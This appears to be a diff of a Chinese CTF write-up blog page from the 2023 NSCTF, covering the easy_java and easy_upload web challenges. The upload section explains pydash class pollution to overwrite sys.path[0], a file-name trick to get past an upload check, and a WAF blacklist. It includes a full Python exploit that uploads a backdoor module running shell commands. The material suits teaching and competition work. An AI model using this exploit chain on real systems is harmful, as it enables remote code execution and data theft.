@@ -42,7 +42,7 @@
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-6.png">
 <meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-7.png">
 <meta property="article:published_time" content="2023-05-20T06:00:00.000Z">
-<meta property="article:modified_time" content="2023-05-25T15:31:24.997Z">
+<meta property="article:modified_time" content="2023-05-25T15:47:24.542Z">
 <meta property="article:author" content="lewiserii">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="宁波">
@@ -336,7 +336,7 @@
 
 <p>使用<code>php://input</code>使得a的值为<code>flag</code>，b同理，d使用<code>php://filter</code>读文件</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/CodeCheck.png"></p>
-<h2 id="easy-node"><a href="#easy-node" class="headerlink" title="easy_node"></a>easy_node</h2><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>访问靶机自动跳转到<code>/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D</code>，并返回<code>json</code><br>访问<code>/parser?body=1</code>，返回<code>plain</code></p>
+<h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>访问靶机自动跳转到<code>/parser?body=%7B&quot;1&quot;%3A&quot;2&quot;%7D</code>，并返回<code>json</code><br>访问<code>/parser?body=1</code>，返回<code>plain</code></p>
 <p>猜测这是一个类型解析器，可以解析输入的数据类型并返回</p>
 <p>fuzz后发现支持xml格式，尝试利用xxe漏洞。因为是java环境，尝试使用<code>jar协议</code>，<a href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/xxe%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html#jar-x2F-x2F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">原理参考</a></p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_java-1.png"></p>
@@ -363,19 +363,19 @@
 <p><code>/app</code>显示当前代码<br><code>/app/get</code>存在后门，有导入包的操作<br><code>/app/set</code>用于设置键值对</p>
 <p>其中存在提示<code># pydash?</code>，表示通过<code>pydash</code>设置属性，而<code>pydash</code>低版本存在类污染，可以利用<code>pydash.set</code>来设置或覆盖属性值，也可以设置路径</p>
 <p>在<code>/app/get</code>路由中存在一个<code>import</code>的操作，当<code>Python</code>解释器遇到<code>import</code>语句时，它会在<code>sys.path</code>变量中指定的路径中搜索模块，其中<code>sys.path[0]</code>则表示最初调用<code>Python</code>解释器的脚本所在的绝对路径</p>
-<p>回过头看文件上传的点，发现没有过滤<code>py</code>后缀，所以我们可以上传一个名称为<code>backdoor</code>的py文件，再利用<code>pydash.set</code>覆盖<code>sys.path[0]</code>的值，使其寻找包时找到我们的恶意包</p>
+<p>所以我们可以上传一个名称为<code>backdoor</code>的py文件，再利用<code>pydash.set</code>覆盖<code>sys.path[0]</code>的值，使其寻找包时找到我们的恶意包</p>
 <p>同时题目中还存在一个waf</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br></code></pre></td></tr></table></figure>
 
 <p>可以利用<code>pydash.helpers</code>导入<code>inspect</code>来绕过</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-2.png"></p>
-<p>还有一点要注意，在上传的第32行中，修改了文件名</p>
+<p>还有一点要注意，上传时对<code>$type</code>进行了检查，不允许上传<code>py</code>类型的文件，但是<code>$type</code>的值是可控的，我们可以将其置空</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//line 32</span><br><span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure>
 
-<p>如果<code>$type</code>为空，即上一个正则没匹配到，就会在文件尾加一个点，例如<code>backdoor.py.</code></p>
-<p>这里也需要绕过，用到了<code>file_put_contents</code>的一个<code>trick</code>，如图</p>
+<p>如果<code>$type</code>为空，就会在文件尾加一个点，例如<code>backdoor.py.</code></p>
+<p>这里可以用<code>file_put_contents</code>的一个<code>trick</code>绕过黑名单，如图</p>
 <p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-3.png"></p>
-<p>例如<code>test.php/.</code>，<code>file_put_contents</code>会自已给标准化成绝对路径</p>
+<p>例如<code>backdoor.py/.</code>，<code>file_put_contents</code>会自已给标准化成绝对路径</p>
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>shell = <span class="hljs-string">&#x27;&#x27;&#x27;import os</span><br><span class="hljs-string">def backdoor():</span><br><span class="hljs-string">    return os.popen(&quot;cat /flag&quot;).read()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    data = <span class="hljs-string">&quot;data:image/;base64,&quot;</span> + base64.b64encode(shell.encode()).decode()<br>    start = <span class="hljs-built_in">int</span>(time.time())<br>    res = requests.post(<br>        url=url+<span class="hljs-string">&quot;index.php?action=base64&amp;path=backdoor.py/&quot;</span>, data=data)<br>    end = <span class="hljs-built_in">int</span>(time.time())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end+<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        data = &#123;<br>            <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.pydash.helpers.inspect.sys.path[0]&quot;</span>,<br>            <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;/tmp/%s/&quot;</span> % (i)<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        requests.post(url=url+<span class="hljs-string">&quot;app/set&quot;</span>,json=data)<br>        res = requests.get(url=url+<span class="hljs-string">&quot;app/get&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag??&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code != <span class="hljs-number">500</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure>
 
